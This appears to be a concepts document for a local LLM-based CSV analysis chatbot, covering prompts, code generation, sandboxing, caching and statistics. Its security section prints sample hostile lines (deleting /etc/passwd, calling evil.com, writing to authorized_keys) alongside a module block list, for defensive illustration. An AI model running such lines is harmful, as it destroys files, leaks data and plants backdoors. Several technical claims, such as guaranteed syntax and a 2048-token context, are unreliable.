# Local Analytic Chatbot - Theory & Concepts

## Core Concepts

### 1. Large Language Models (LLMs) for Code Generation

#### What are LLMs?
Large Language Models are neural networks trained on vast amounts of text data. They predict the next token (word piece) based on previous tokens, enabling them to generate coherent text sequences.

#### Why Use LLMs for Data Analysis?
- **Natural Language Interface**: Users ask questions in plain English
- **Flexible Reasoning**: Understand complex analysis requests
- **Code Generation**: Convert questions to executable Python/SQL
- **Context Awareness**: Remember column names and data structure

#### Mistral 7B vs Other Models
| Aspect | Mistral 7B | GPT-3.5 | GPT-4 |
|--------|-----------|---------|--------|
| **Size** | 7 billion parameters | 175B | 1.7T |
| **Speed** | Local (~200ms) | API (~1s) | API (~2s) |
| **Cost** | Free | $0.0015/1K tokens | $0.03/1K tokens |
| **Privacy** | 100% local | Sent to OpenAI | Sent to OpenAI |
| **Accuracy** | 80-85% | 85-90% | 90%+ |

**Choice Rationale**: Balance of speed, accuracy, and privacy for local deployment.

### 2. Prompt Engineering

#### System Prompts
A system prompt defines the LLM's behavior and constraints. It's the "instruction manual" for what the model should do.

```
System Prompt = [Role Definition] + [Task Description] + [Constraints] + [Format]
```

**Our Two-Prompt Strategy**:

**Prompt A: Analysis/Summary** (ENHANCED_SYSTEM_PROMPT)
```
"You are a professional Data Analyst...
Respond with 2-4 sentences containing:
- Concrete metrics
- Key findings
- Business implications"
```
- **Why**: Analysis questions need human-readable insights
- **Example Q**: "What's in this data?"
- **Example A**: "Dataset has 5,420 users across 15 attributes..."

**Prompt B: Code Generation** (SYSTEM_PROMPT)
```
"You are a data analysis expert...
Generate ONE-LINE Python code using semicolons...
MUST normalize columns...
MUST validate against available columns"
```
- **Why**: Visualization questions need executable code
- **Example Q**: "Show me top 10 cities"
- **Example A**: `<CODE>df = pd.read_csv(...); df['city'].value_counts()...</CODE>`

#### Prompt Injection Prevention
- **Input Sanitization**: Strip dangerous keywords
- **Constraint Enforcement**: Hardcoded limitations in prompt
- **Output Validation**: Check for code safety before execution

### 3. One-Line Code Generation

#### Why One-Line?
Traditional multi-line code generation is prone to:
- Syntax errors (indentation, brackets)
- Incomplete logic (missing imports, variables)
- Execution context issues

One-line code with semicolon separation:
```python
# Instead of this (prone to errors):
df = pd.read_csv(FILE_PATH)
df.columns = df.columns.str.lower()
top = df['city'].value_counts().head(10)
plt.figure(figsize=(12,6))
plt.bar(top.index, top.values)

# We do this (deterministic):
df = pd.read_csv(FILE_PATH); df.columns = df.columns.str.lower(); top = df['city'].value_counts().head(10); plt.figure(figsize=(12,6)); plt.bar(top.index, top.values); plt.savefig(CHART_PATH); RESULT = plt
```

**Advantages**:
- Guaranteed valid syntax
- No indentation issues
- Complete in single pass
- Easy to validate

### 4. Data Profiling & Understanding

#### What is Data Profiling?
Data profiling analyzes a dataset to understand:
- **Structure**: Columns, data types, relationships
- **Quality**: Missing values, duplicates, outliers
- **Statistics**: Min/max, mean, standard deviation, quartiles
- **Patterns**: Correlations, distributions, anomalies

#### Profile Components

```python
profile = {
    'shape': (5000, 15),                    # rows × columns
    'columns': ['id', 'name', 'age', ...],  # column names
    'dtypes': {'id': 'int64', 'name': 'object', ...},
    'missing': {'name': 12, 'email': 0},    # null counts
    'unique_values': {'gender': 3, 'city': 487},
    'outliers': {'age': 15},                # suspicious values
    'correlation': {...},                    # numeric correlations
    'describe': {...},                       # statistical summary
    'sample': [{...}, {...}]                # first few rows
}
```

#### Why Profile on Upload?
1. **Quick Understanding**: Users see data structure immediately
2. **Smart Analysis**: System knows what columns are available
3. **Data Quality**: Identify issues early
4. **Optimization**: Decide sampling vs. full processing

### 5. Safe Code Execution

#### The Challenge
Generated code could be malicious:
```python
# Dangerous code:
os.remove('/etc/passwd')           # Delete system files
requests.get('http://evil.com')    # Phone home
df.to_csv('/root/.ssh/authorized_keys')  # Backdoor
```

#### Our Defense: Sandbox Execution
1. **Whitelist Approach**: Only allow specific libraries
   - ✅ pandas, numpy, matplotlib
   - ✅ Built-in: math, statistics
   - ❌ os, sys, requests, subprocess

2. **Context Restriction**: Limited variable scope
   - ✅ FILE_PATH (read-only path)
   - ✅ CHART_PATH (write-only path)
   - ❌ No access to globals, __builtins__

3. **Timeout Protection**: Kill hung processes
   ```python
   execute_python_safely(code, timeout=30)  # 30 seconds max
   ```

4. **Resource Limits**: Cap memory/CPU
   - Max 500MB memory per execution
   - Max 30 seconds runtime

### 6. Multi-File Analysis

#### Single vs. Multi-File Analysis

**Single File**:
```
Question: "Show top 10 cities"
File: users.csv
→ Analysis: Distribution of users by city
```

**Multi-File**:
```
Question: "Compare user distribution across datasets"
Files: users.csv, users_2024.csv, users_archive.csv
→ Analysis: Build context from ALL files
           Find common columns
           Compare metrics across files
```

#### Implementation
```python
# Context building for multi-file
for file in file_paths:
    df = load_csv(file)
    context += f"File: {name} - {len(df)} rows × {len(df.columns)} cols"
    context += f"Columns: {', '.join(df.columns[:10])}"

prompt = f"{system_prompt}\n\n{context}\n\nQuestion: {question}"
```

#### Use Cases
1. **Temporal Analysis**: Compare data across time periods
2. **A/B Testing**: Analyze treatment vs. control groups
3. **Validation**: Cross-check results across similar datasets
4. **Aggregation**: Combine insights from related sources

### 7. Column Normalization

#### The Problem
CSVs from different sources have inconsistent column naming:
```
Same concept, different names:
- 'user_id' vs 'userId' vs 'User ID' vs 'id'
- 'Location_CITY' vs 'city' vs 'City Name'
- 'profit margin' vs 'profitMargin' vs 'profit_margin'
```

#### Our Solution: Lowercase + Strip
```python
df.columns = df.columns.str.lower().str.strip()

# Before:
'Location_CITY', 'User ID', 'profit margin'

# After:
'location_city', 'user id', 'profit margin'
```

**Benefits**:
- Consistent column references in code
- User can write 'City' or 'city' (both work)
- LLM learns normalized names in prompt context
- Reduces errors in analysis

### 8. Chart Generation & Visualization

#### Chart Types Supported

| Chart Type | Best For | Example |
|-----------|----------|---------|
| **Bar** | Categories, counts | Top 10 cities |
| **Line** | Time series, trends | User growth over time |
| **Area** | Cumulative trends | Revenue accumulation |
| **Pie** | Composition, percentages | Market share |
| **Doughnut** | Composition, better for space | Product mix |
| **Scatter** | Correlation, outliers | Age vs. income |

#### Chart.js Integration
```javascript
// Frontend chart rendering
new Chart(ctx, {
    type: 'bar',
    data: {
        labels: ['City1', 'City2', ...],
        datasets: [{
            label: 'Count',
            data: [100, 200, ...],
            backgroundColor: '#3b82f6'
        }]
    },
    options: {
        responsive: true,
        plugins: { legend: {...} }
    }
});
```

#### Chart Generation Pipeline
```
1. User asks for visualization
   ↓
2. LLM generates matplotlib code
   ↓
3. Code validates (whitelist, timeouts)
   ↓
4. Execute: plt.savefig(CHART_PATH) creates PNG
   ↓
5. Convert PNG → Base64
   ↓
6. Send to frontend as: data:image/png;base64,...
   ↓
7. Browser embeds in <img> tag
```

### 9. Caching Strategy

#### Why Cache?
Users often ask multiple questions about the same file:
```
Q1: "What's in this data?"
Q2: "Show me top 10 cities"
Q3: "Any anomalies?"
```

Without caching: Load and normalize CSV 3 times  
With caching: Load once, reuse

#### Implementation
```python
FILE_CACHE = {}  # {file_path: dataframe}
MAX_CACHE_SIZE = 5  # Keep 5 most recent

# On file load:
if file_path not in FILE_CACHE:
    df = pd.read_csv(file_path)
    FILE_CACHE[file_path] = df
    if len(FILE_CACHE) > MAX_CACHE_SIZE:
        oldest = list(FILE_CACHE.keys())[0]
        del FILE_CACHE[oldest]
```

#### Trade-offs
- **Pros**: 10x faster repeated queries, lower latency
- **Cons**: Memory usage, stale data if file changes

### 10. Error Handling & Recovery

#### Error Types & Responses

**Data Quality Issues**:
```
❌ KeyError: Column 'xyz' not found
✅ Response: "Column may not exist. Try 'What columns do I have?'"
```

**Execution Errors**:
```
❌ Timeout: Code took > 30 seconds
✅ Response: "Limit data size with .head(100) or use sampling"
```

**LLM Errors**:
```
❌ Empty response from model
✅ Fallback: Generate summary from file profile instead
```

#### User Feedback Loop
- Clear error messages (not stack traces)
- Helpful suggestions for fixes
- Option to try different approaches
- Chat history for learning

---

## Advanced Topics

### A. Statistical Concepts Used

#### Correlation
Measures how two variables move together.
```
Correlation = 1: Perfect positive (both increase together)
Correlation = 0: No relationship
Correlation = -1: Perfect negative (opposite movement)
```

Used to find related columns for analysis.

#### Quartiles & Outliers
```
Q1 (25%): 25% of data below this value
Q2 (50%): Median
Q3 (75%): 75% of data below this value
IQR = Q3 - Q1

Outliers: Values > Q3 + 1.5×IQR or < Q1 - 1.5×IQR
```

#### Distribution Types
```
Normal: Bell curve, most common
Skewed: Tail on one side (left/right)
Bimodal: Two peaks
Uniform: All values equally likely
```

### B. NLP Concepts

#### Tokenization
LLMs work with tokens, not characters:
```
Text: "How many cities?"
Tokens: ["How", " many", " cities", "?"]  (may differ)

Max context: 2048 tokens in Mistral 7B
```

#### Temperature & Sampling
```
Temperature = 0.0
→ Always pick most likely token (deterministic)
→ Good for: Code generation (reproducibility)

Temperature = 1.0
→ Sample proportionally to probability (random)
→ Good for: Creative writing (variety)

Our setting: 0.0-0.1 (predictable, precise)
```

#### Top-P & Top-K
```
Top-K = 40: Consider only top 40 most likely tokens
Top-P = 0.85: Consider tokens until cumulative probability reaches 85%

Purpose: Reduce "nonsense" while allowing some variety
```

### C. Data Processing Patterns

#### ETL (Extract, Transform, Load)
```
Extract:   Load CSV from disk
Transform: Normalize columns, handle missing values
Load:      Return as JSON or cache in memory
```

#### Aggregation
```
Raw:  Each row = individual user
      user_id | city | age
      1       | NYC  | 25
      2       | NYC  | 30
      3       | LA   | 28

Aggregated: Group by city
      city | count | avg_age
      NYC  | 2     | 27.5
      LA   | 1     | 28
```

#### Filtering & Selection
```
Filter: df[df['age'] > 25]         # Keep only age > 25
Select: df[['id', 'name']]         # Keep only these columns
Combine: df[(df['age'] > 25) & (df['city'] == 'NYC')]
```

### D. Performance Optimization Techniques

#### Row Sampling
```
Full processing: 500,000 rows × 15 columns = 7.5M values
Sampled: 5,000 rows × 15 columns = 75k values (100x faster)

Trade-off: Less precision for much faster response
```

#### Column Selection
```
Use: df[['important_col1', 'important_col2']]
Instead of: df (all 50 columns)

Benefit: Reduce memory, computation, visualization clutter
```

#### Index-Based Operations
```
df.index_col = 'id'           # Use 'id' as index
df.loc['user123']              # O(1) lookup instead of O(n)
```

### E. Security Principles

#### Defense in Depth
Multiple layers of protection:
1. Input validation (sanitize user input)
2. Whitelist approach (only allow safe operations)
3. Sandboxing (isolated execution context)
4. Monitoring (log and alert on suspicious activity)
5. Timeouts (prevent infinite loops)

#### Principle of Least Privilege
```
Code gets:
✅ Read access to: /data/uploads/*.csv
✅ Write access to: /tmp/chart.png
❌ Access to: /etc/, /root/, network, system calls
```

#### Fail Secure
```
If validation fails: Reject and explain
If timeout occurs: Kill process and report
If error happens: Show error, don't expose internals
```

---

## Machine Learning Context

### Classification vs. Regression vs. Exploration
- **Classification**: Predict categories (yes/no, A/B/C)
- **Regression**: Predict numbers (price, age, sales)
- **Exploration**: Understand data (this tool)

Our tool focuses on **exploration & understanding**.

### Feature Engineering
Converting raw data into useful features:
```
Raw: birth_year = 1990
Feature: age = 2024 - 1990 = 34

Raw: order_date = "2024-01-15"
Feature: day_of_week = Monday, month = January

Our tool: Suggests which columns might be useful
```

### Dimensionality
```
High dimension: Many columns (100+)
→ Visualization difficult, computation slow

Low dimension: Few columns (< 10)
→ Easy to visualize, quick analysis

Our strategy: Show top correlations, reduce dimensions for charts
```

---

## Common Analysis Patterns

### Pattern 1: Distribution Analysis
```
Question: "What does the age distribution look like?"
→ Histogram, density plot, or box plot
→ Look for: Normal vs. skewed, outliers, modes
```

### Pattern 2: Categorical Breakdown
```
Question: "Break down users by city"
→ Bar chart showing counts per category
→ Look for: Which categories dominate, are there tail categories
```

### Pattern 3: Time Series
```
Question: "Show user growth over time"
→ Line chart with time on X-axis
→ Look for: Trends, seasonality, anomalies, inflection points
```

### Pattern 4: Correlation Analysis
```
Question: "What's related to high spending?"
→ Scatter plot or correlation heatmap
→ Look for: Strong positive/negative correlations
```

### Pattern 5: Comparative Analysis
```
Question: "How do 2024 and 2025 users compare?"
→ Side-by-side bar charts or box plots
→ Look for: Differences, improvements, regressions
```

---

## Decision Trees for Analysis

### When to use which chart?

```
Question: "How many...?"
    ├─ Per category? → Bar chart
    ├─ Over time? → Line chart
    └─ As percentage? → Pie chart

Question: "Is there a relationship...?"
    ├─ Between two numbers? → Scatter plot
    └─ Among many variables? → Heatmap

Question: "What's the distribution?"
    ├─ For a number? → Histogram / Box plot
    └─ For categories? → Bar chart
```

### When to ask the assistant?
```
"What's in this data?" → Assistant profiles it
"Any anomalies?" → Assistant does outlier detection
"What should I analyze?" → Assistant suggests patterns
"Summarize it" → Assistant extracts key metrics
```

---

**Key Takeaway**: This system bridges natural language and data analysis through:
1. LLMs to understand intent
2. Prompts to guide behavior
3. Sandboxing to ensure safety
4. Visualization to communicate insights
5. Caching to optimize performance

**Last Updated**: December 2025  
**Version**: 2.0
